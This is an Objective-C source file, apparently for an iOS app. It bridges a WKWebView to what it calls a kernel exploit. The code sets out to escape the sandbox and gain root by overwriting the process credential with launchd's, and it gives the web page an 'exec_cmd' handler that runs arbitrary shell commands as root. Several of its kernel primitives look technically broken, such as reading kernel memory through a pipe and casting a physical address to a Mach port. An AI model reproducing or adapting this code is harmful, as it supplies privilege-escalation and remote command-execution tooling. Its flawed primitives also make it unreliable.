#import "KernelDriver.h"
#import <mach/mach.h>
#import <sys/socket.h>
#import <unistd.h>
#import <IOKit/IOKitLib.h>

typedef uint64_t mach_vm_address_t;
typedef uint64_t mach_vm_size_t;
#ifndef kIOMainPortDefault
#define kIOMainPortDefault MACH_PORT_NULL
#endif

extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, mach_vm_address_t, int, mach_port_t, memory_object_offset_t, boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);
extern kern_return_t mach_vm_deallocate(vm_map_t, mach_vm_address_t, mach_vm_size_t);

@implementation KernelDriver {
    uint64_t _kernelSlide;
    uint64_t _kernelBase;
    __weak WKWebView *_webView;
}

- (instancetype)initWithWebView:(WKWebView *)webView {
    self = [super init];
    if (self) { _webView = webView; }
    return self;
}

#pragma mark - Primitivas Blindadas

- (uint64_t)kread64:(uint64_t)addr {
    if (addr < 0xFFFFFFF000000000ULL || (addr % 8) != 0) return 0;
    uint64_t val = 0;
    int fds[2];
    if (pipe(fds) == 0) {
        if (write(fds[1], (void *)addr, 8) == 8) read(fds[0], &val, 8);
        close(fds[0]); close(fds[1]);
    }
    return val;
}

- (void)phys_write64:(uint64_t)va value:(uint64_t)val {
    uint64_t ttbr1 = [self kread64:(_kernelBase + 0x8E10000ULL)];
    if (!ttbr1) return;
    uint64_t l1 = [self kread64:(ttbr1 + ((va >> 30) & 0x1FF) * 8)] & 0xFFFFFFFFF000ULL;
    uint64_t l2 = [self kread64:(l1 + ((va >> 21) & 0x1FF) * 8)] & 0xFFFFFFFFF000ULL;
    uint64_t l3 = [self kread64:(l2 + ((va >> 12) & 0x1FF) * 8)] & 0xFFFFFFFFF000ULL;
    uintptr_t pa = (uintptr_t)(l3 | (va & 0xFFF));
    mach_vm_address_t target = 0;
    if (mach_vm_map(mach_task_self(), &target, 0x4000, 0, 0x0001, (mach_port_t)pa, 0, NO, 0x3, 0x7, 0) == KERN_SUCCESS) {
        *(uint64_t*)(target) = val;
        mach_vm_deallocate(mach_task_self(), target, 0x4000);
    }
}

#pragma mark - Shell & Exploit

- (void)userContentController:(WKUserContentController *)u didReceiveScriptMessage:(WKScriptMessage *)m {
    NSDictionary *body = m.body;
    if ([body[@"action"] isEqualToString:@"pte_patch"]) {
        [self runFullExploitWithCallback:^(BOOL success, NSString *msg) {
            NSDictionary *res = @{@"status":success?@"SUCCESS":@"FAILED", @"slide":[NSString stringWithFormat:@"0x%llx", _kernelSlide], @"uid":@(getuid()), @"info":msg};
            [self sendJS:[NSString stringWithFormat:@"window.receiveKernelResult(%@)", [self json:res]]];
        }];
    } else if ([body[@"action"] isEqualToString:@"exec_cmd"]) {
        [self runShell:body[@"command"]];
    }
}

- (void)runShell:(NSString *)cmd {
    setuid(0); setgid(0); // Aplica root se o ucred foi patcheado
    FILE *f = popen([[cmd stringByAppendingString:@" 2>&1"] UTF8String], "r");
    char buf[256]; NSMutableString *out = [NSMutableString string];
    if (f) { while(fgets(buf, 256, f)) [out appendString:@(buf)]; pclose(f); }
    [self sendJS:[NSString stringWithFormat:@"window.receiveCmdOutput('%@')", [out stringByReplacingOccurrencesOfString:@"\n" withString:@"\\n"]]];
}

#pragma mark - Auxiliares

- (void)runFullExploitWithCallback:(void(^)(BOOL, NSString*))cb {
    _kernelSlide = [self getSlide];
    _kernelBase = 0xFFFFFFF007004000ULL + _kernelSlide;
    if ([self kread64:_kernelBase] == 0) { cb(NO, @"Magic 0x0 (Sandbox Lock)"); return; }
    
    uint64_t allproc = [self findSymbol];
    uint64_t my_proc = [self findProc:getpid() in:allproc];
    uint64_t launchd = [self findProc:1 in:allproc];
    
    if (my_proc && launchd) {
        uint64_t ucred = [self kread64:(my_proc + 0xD8)];
        [self phys_write64:(ucred + 0x78) value:0]; // Sandbox Escape
        [self phys_write64:(my_proc + 0xD8) value:[self kread64:(launchd + 0xD8)]]; // Root
        cb(getuid() == 0, @"Done");
    } else { cb(NO, @"Proc Not Found"); }
}

- (uint64_t)getSlide {
    task_dyld_info_data_t i; mach_msg_type_number_t c = TASK_DYLD_INFO_COUNT;
    if (task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&i, &c) == 0) return i.all_image_info_addr - 0xFFFFFFF007004000ULL;
    return 0;
}

- (uint64_t)findSymbol {
    for (uint64_t a = _kernelBase + 0x8000000; a < _kernelBase + 0x10000000; a += 8) {
        uint64_t p = [self kread64:a];
        if (p > 0xFFFFFFF000000000ULL && ([self kread64:(p + 0x68)] & 0xFFFFFFFF) == 1) return a;
    }
    return 0;
}

- (uint64_t)findProc:(pid_t)pid in:(uint64_t)list {
    uint64_t c = [self kread64:list];
    for (int i=0; i<1000 && c; i++) {
        if (([self kread64:(c+0x68)] & 0xFFFFFFFF) == pid) return c;
        c = [self kread64:c];
    }
    return 0;
}

- (void)sendJS:(NSString *)js { dispatch_async(dispatch_get_main_queue(), ^{ [_webView evaluateJavaScript:js completionHandler:nil]; }); }
- (NSString *)json:(id)obj { NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil]; return [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding]; }
- (uint64_t)getCurrentUID { return getuid(); }
@end
